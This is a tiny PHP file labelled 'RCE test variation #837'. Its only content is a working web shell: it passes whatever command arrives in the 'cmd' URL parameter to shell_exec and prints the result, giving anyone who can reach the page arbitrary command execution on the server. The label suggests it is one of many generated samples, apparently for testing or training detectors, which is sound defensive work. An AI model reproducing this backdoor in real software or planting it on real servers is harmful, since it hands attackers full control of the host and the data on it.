<?php
// RCE test variation #837
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>